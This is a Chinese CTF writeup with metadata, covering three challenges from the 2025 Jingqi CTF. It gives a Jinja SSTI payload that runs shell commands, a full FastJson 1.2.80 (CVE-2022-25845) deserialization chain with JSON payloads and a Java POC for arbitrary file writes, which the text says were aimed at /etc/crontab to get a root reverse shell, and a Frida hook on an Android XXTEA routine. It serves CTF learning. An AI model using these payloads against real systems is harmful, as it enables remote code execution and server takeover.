---
title: 2025 第三届京麒 CTF 挑战赛 writeup by Mini-Venom
contest: 京麒 CTF
year: 2025
difficulty: medium
vuln_type: web_unknown
tags:
- SSTI
- 删disable
- FastJson1.2.80
- CVE-2022-25845
- JsonGenerationException
- FilterFileOutputStream
- MarshalOutputStream
- InflaterOutputStream
- /etc/crontab
- Frida hook
- XXTEA
- libre0.so
attack_chain:
- '计算器题: 删 disable 后 ''''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__[''__builtins__''][''eval''](''__import__("os").popen("env").read()'') 拿 flag'
- 'FastJ 题 step1: 双 @type 触发 JsonGenerationException 缓存 UTF8JsonGenerator'
- 'FastJ 题 step2: $ref 二次取 OutputStream 走 MarshalOutputStream+InflaterOutputStream+FilterFileOutputStream 写 /etc/crontab'
- DeflaterOutputStream 把反弹 shell 指令压缩 + base64 作为 array 字段
- Crontab root 反弹 shell → RCE
- '安卓题: Frida hook libre0.so+0x184C 的 XXTEA 加密函数观察入参出参'
key_payload: '''{{+__class__+__mro__+__subclasses__+__init__+__globals__+__builtins__+eval+popen(env).read()}} + FastJson1.2.80 CVE-2022-25845 双 @type 缓存链'''
one_liner: 京麒 CTF 三题 — SSTI 绕 disable 直接 RCE + FastJson 1.2.80 CVE-2022-25845 写 /etc/crontab 反弹 + 安卓 XXTEA Frida hook 提取密钥。
lesson: FastJson 1.2.80 黑名单禁了 FileOutputStream 但应用自定义 FilterFileOutputStream 时仍可借 sun.rmi.server.MarshalOutputStream 走 RCE；SSTI 沙箱 disable 删配置即可破。
quality: high
full_path: 2025第三届京麒CTF挑战赛_writeup_by_Mini-Venom.full.md
meta_path: 2025第三届京麒CTF挑战赛_writeup_by_Mini-Venom.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2025 第三届京麒 CTF 挑战赛 writeup by Mini-Venom。京麒 CTF 三题 — SSTI 绕 disable 直接 RCE + FastJson 1.2.80 CVE-2022-25845 写 /etc/crontab 反弹 + 安卓 XXTEA Frida hook 提取密钥。。关键路径：计算器题: 删 disable 后 ''''.__class__.__mro__...'
category: web
subcategory: web_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/249673.html
wp_author: Mini-Venom
reasoning_chain:
- 触发点：计算器题 SSTI 沙箱过滤关键字 → 假设：直接删 disable 配置文件 → 动作：文件删除后 ''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['__builtins__']['eval']
- 下一步：eval('__import__("os").popen("env").read()') → 读环境变量得 flag
- 触发点：FastJson 1.2.80 应用自定义 FilterFileOutputStream → 假设：CVE-2022-25845 风格双 @type 链 → 动作：第一 @type=java.lang.Exception 缓存 UTF8JsonGenerator.out
- 下一步：第二 @type=com.fasterxml.jackson.core.JsonGenerator 缓存 $ref 二次取 OutputStream
- 触发点：写文件链 OutputStream → MarshalOutputStream → InflaterOutputStream → FilterFileOutputStream → 假设：把反弹 shell 指令 Deflater 压缩 + base64 作为 array
- 下一步：写入 /etc/crontab (root 权限) → 触发反弹 shell RCE
- 触发点：安卓 Reverse libre0.so + 0x184C 是 XXTEA 加密 → 假设：Frida hook 观察 args[0] args[2] args[3] + hexdump
- 下一步：Interceptor.attach 拿到明文 → 反推 XXTEA key + 提取明文
failed_attempts:
- 试图单 @type 触发 JsonGenerationException → 失败：必须双 @type 链式缓存 UTF8JsonGenerator
- 试图用 FileOutputStream 直接写 → 失败：1.2.80 黑名单禁了，应用自定义 FilterFileOutputStream 才行
- 试图 hook 整个 libre0.so → 失败：必须精确 hook XXTEA 函数 +0x184C 偏移
key_observations:
- SSTI 沙箱 disable 删配置即可破，最稳 payload ''.__class__.__mro__[1].__subclasses__()[80]
- FastJson 1.2.80 黑名单禁 FileOutputStream 但应用自定义 FilterFileOutputStream 仍可借 sun.rmi.server.MarshalOutputStream 走 RCE
- CVE-2022-25845 = 双 @type 链触发 JsonGenerationException 缓存 UTF8JsonGenerator
- /etc/crontab 写反弹 shell 是 FastJson 反序列化经典后渗透动作
- Frida hook .so+offset 是安卓 native 反向的常规做法
prerequisites:
- Flask/Jinja SSTI 链（__class__/__mro__/__subclasses__）
- FastJson 1.2.80 利用链 + CVE-2022-25845
- Deflater/Inflater + base64 编码压缩
- Frida hook native 加密函数
---
# 2025第三届京麒CTF挑战赛 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/249673.html
> ID: 249673

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱 admin@chamd5.org(带上简历和想加入的小组)  

Web:

计算器

''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("env").read()')

删掉disable直接读环境变量

FastJ

本题WP由团队师傅提供。

分析

FastJson1.2.80最新利用

https://github.com/luelueking/CVE-2022-25845-In-Spring

通过Exception期望类可以缓存一些新类，上面能缓存InputStream。

问题任意文件读写需要common-io，需要找到openjdk11下的任意文件读写。

注意到题目采用JDK11，JDK11自带符号信息，可以调用任意构造函数。那么很可能还是利用OutputStream下的子类实现任意文件写。

第一步：缓存OutputStream

根据缓存InputStream的利用，找到缓存OutputStream的gadget。

UTF8JsonGenerator
JsonGenerator
JsonGenerationException
Exception

payload：

{"a":"{"@type":"java.lang.Exception","@type":"com.fasterxml.jackson.core.JsonGenerationException","g":{}}","b":{"$ref":"$.a.a"},"c":"{"@type":"com.fasterxml.jackson.core.JsonGenerator","@type":"com.fasterxml.jackson.core.json.UTF8JsonGenerator","out":{}}","d":{"$ref":"$.c.c"}}

第二步：任意文件写

1.2.80禁用了FileOutputStream，但题目实现了FilterFileOutputStream，结合rmb的利用可实现任意文件写。

{"@type":"java.io.OutputStream","@type":"sun.rmi.server.MarshalOutputStream","out":{"@type":"java.util.zip.InflaterOutputStream","out":{"@type":"com.app.FilterFileOutputStream","name":"/tmp/1234","prefix":"/"},"infl":{"input":{"array":"eJzT0jdU0IJC/aTMPP2kxOIMBd1kBXUII1PBTk1BPyW1TL8kuUDfQs/QxEzPyMAUiI30LSwsLRUM7NQM1QFanhCv","limit":${length}}},"bufLen":"100"},"protocolVersion":1}

array是一个压缩流，生成array方式如下：

String input = "123123123123";
ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
try (DeflaterOutputStream deflaterOutputStream = new DeflaterOutputStream(byteArrayOutputStream)) {
    deflaterOutputStream.write(input.getBytes("UTF-8"));
}
String encoded = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
int leng = byteArrayOutputStream.toByteArray().length;
System.out.println(encoded);

limit设置为解压缩后byte的length。

第三步：定时任务

这步需要些脑洞。测试时发现远程可以在/root目录下写文件，判断权限为root。因此任意文件写到/etc/crontab，定时任务反弹shell即可。

POC

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.zip.DeflaterOutputStream;
import java.util.zip.InflaterInputStream;

publicclass POC {
    static String target = "http://localhost:
8080/";

    public static Object sendJson(String payload) {
        try {
            RestTemplate restTemplate = new RestTemplate();

            HttpHeaders httpHeaders = new HttpHeaders();
            httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

            LinkedMultiValueMap<Object, Object> map = new LinkedMultiValueMap<>();
            map.add("json", payload);

            HttpEntity<LinkedMultiValueMap<Object, Object>> request = new HttpEntity<>(map, httpHeaders);

            return restTemplate.postForObject(target, request, String.class);
        } catch (RestClientException e) {
            return"null";
        }
    }

    public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, InterruptedException {
        // 1. add inputStream to fastjson cache
        String payload1 = new String(Files.readAllBytes(Paths.get("payloads/step1.json")));
        sendJson(payload1);
        System.out.println(payload1);

        String path = "E://squirt1e.txt";

        String input = "nese123";
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        try (DeflaterOutputStream deflaterOutputStream = new DeflaterOutputStream(byteArrayOutputStream)) {
            deflaterOutputStream.write(input.getBytes("UTF-8"));
        }

        String encoded = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        int leng = byteArrayOutputStream.toByteArray().length;

        String payload2 = new String(Files.readAllBytes(Paths.get("payloads/step3-.json")));
        payload2 = payload2.replace("{ABC}", encoded).replace(""{ABCD}"",String.valueOf(leng)).replace("{path}",path);
        sendJson(payload2);
        System.out.println(payload2);

    }

step1.json

{
  "a": "{    "@type": "java.lang.Exception",    "@type": "com.fasterxml.jackson.core.JsonGenerationException",    "g": {    }  }",
  "b": {
    "$ref": "$.a.a"
  },
  "c": "{  "@type": "com.fasterxml.jackson.core.JsonGenerator",  "@type": "com.fasterxml.jackson.core.json.UTF8JsonGenerator",  "out": {}}",
  "d": {
    "$ref": "$.c.c"
  }
}

step3-.json

{
  "@type": "java.io.OutputStream",
"@type": "sun.rmi.server.MarshalOutputStream",
"out": {
    "@type": "java.util.zip.InflaterOutputStream",
    "out": {
      "@type": "com.app.FilterFileOutputStream",
      "name": "{path}",
      "prefix": "/"
    },
    "infl": {
      "input": {
        "array": "{ABC}",
        "limit": "{ABCD}"
      }
    },
    "bufLen": "100"
  },
"protocolVersion": 1
}

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
UTF8JsonGenerator
JsonGenerator
JsonGenerationException
Exception
{"a":"{"@type":"java.lang.Exception","@type":"com.fasterxml.jackson.core.JsonGenerationException","g":{}}","b":{"$ref":"$.a.a"},"c":"{"@type":"com.fasterxml.jackson.core.JsonGenerator","@type":"com.fasterxml.jackson.core.json.UTF8JsonGenerator","out":{}}","d":{"$ref":"$.c.c"}}
{"@type":"java.io.OutputStream","@type":"sun.rmi.server.MarshalOutputStream","out":{"@type":"java.util.zip.InflaterOutputStream","out":{"@type":"com.app.FilterFileOutputStream","name":"/tmp/1234","prefix":"/"},"infl":{"input":{"array":"eJzT0jdU0IJC/aTMPP2kxOIMBd1kBXUII1PBTk1BPyW1TL8kuUDfQs/QxEzPyMAUiI30LSwsLRUM7NQM1QFanhCv","limit":${length}}},"bufLen":"100"},"protocolVersion":1}
String input = "123123123123";
ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
try (DeflaterOutputStream deflaterOutputStream = new DeflaterOutputStream(byteArrayOutputStream)) {
    deflaterOutputStream.write(input.getBytes("UTF-8"));
}
String encoded = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
int leng = byteArrayOutputStream.toByteArray().length;
System.out.println(encoded);
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.zip.DeflaterOutputStream;
import java.util.zip.InflaterInputStream;

publicclass POC {
    static String target = "http://localhost:
8080/";

    public static Object sendJson(String payload) {
        try {
            RestTemplate restTemplate = new RestTemplate();

            HttpHeaders httpHeaders = new HttpHeaders();
            httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

            LinkedMultiValueMap<Object, Object> map = new LinkedMultiValueMap<>();
            map.add("json", payload);

            HttpEntity<LinkedMultiValueMap<Object, Object>> request = new HttpEntity<>(map, httpHeaders);

            return restTemplate.postForObject(target, request, String.class);
        } catch (RestClientException e) {
            return"null";
        }
    }

    public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, InterruptedException {
        // 1. add inputStream to fastjson cache
        String payload1 = new String(Files.readAllBytes(Paths.get("payloads/step1.json")));
        sendJson(payload1);
        System.out.println(payload1);

        String path = "E://squirt1e.txt";

        String input = "nese123";
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        try (DeflaterOutputStream deflaterOutputStream = new DeflaterOutputStream(byteArrayOutputStream)) {
            deflaterOutputStream.write(input.getBytes("UTF-8"));
        }

        String encoded = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        int leng = byteArrayOutputStream.toByteArray().length;

        String payload2 = new String(Files.readAllBytes(Paths.get("payloads/step3-.json")));
        payload2 = payload2.replace("{ABC}", encoded).replace(""{ABCD}"",String.valueOf(leng)).replace("{path}",path);
        sendJson(payload2);
        System.out.println(payload2);

    }
{
  "a": "{    "@type": "java.lang.Exception",    "@type": "com.fasterxml.jackson.core.JsonGenerationException",    "g": {    }  }",
  "b": {
    "$ref": "$.a.a"
  },
  "c": "{  "@type": "com.fasterxml.jackson.core.JsonGenerator",  "@type": "com.fasterxml.jackson.core.json.UTF8JsonGenerator",  "out": {}}",
  "d": {
    "$ref": "$.c.c"
  }
}
{
  "@type": "java.io.OutputStream",
"@type": "sun.rmi.server.MarshalOutputStream",
"out": {
    "@type": "java.util.zip.InflaterOutputStream",
    "out": {
      "@type": "com.app.FilterFileOutputStream",
      "name": "{path}",
      "prefix": "/"
    },
    "infl": {
      "input": {
        "array": "{ABC}",
        "limit": "{ABCD}"
      }
    },
    "bufLen": "100"
  },
"protocolVersion": 1
}
bytes_array = [
  0x90, 0xFB, 0xF1, 0x17, 0x89, 0x89, 0x89, 0xF5, 0x86, 0x7D, 
  0xF5, 0xB6, 0x73, 0xB5
]
last_byte = bytes_array[-1]
target = 0xC3
xor_char = last_byte ^ target

# 检查是否在 0-9, a-z, _ 范围内
if (48 <= xor_char <= 57) or (97 <= xor_char <= 122) or (xor_char == 95):
    print(f"找到的异或字符: '{chr(xor_char)}'")
else:
    print("没有找到符合条件的异或字符。")
function getModuleBaseAddress(moduleName) {
    return Process.getModuleByName(moduleName).base;
}

function getFunctionAddress(moduleName, offset) {
    const base = getModuleBaseAddress(moduleName);
    return base.add(offset);
}

function hookSub2E668() {
    const moduleName = "libre0.so";
    const funcOffset = 0x184C;
    const funcAddress = getFunctionAddress(moduleName, funcOffset);
    
    console.log(`tea address: ${funcAddress}`);
    
    Interceptor.attach(funcAddress, {
        onEnter: function(args) {
            console.log(`tea called with:`);
            console.log(`  arg1 (X0): ${args[0]}`);
            console.log(`  arg2 (X2): ${args[2]}`);
            console.log(`  arg2 (X3): ${args[3]}`);
            //console.log(`  arg2 (X1): ${args[1]}`);

            console.log(hexdump(args[0]));
            console.log(hexdump(args[2]));
            console.log(hexdump(args[3]));
            //console.log(hexdump(args[1]));
        },
        onLeave: function(retval) {
            //打印xxtea加密之后的结果
            console.log(`tea returned: ${retval}`);
            console.log(hexdump(retval));
        }
    });
}

// 延迟执行以确保模块加载
setImmediate(hookSub2E668,2000);
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]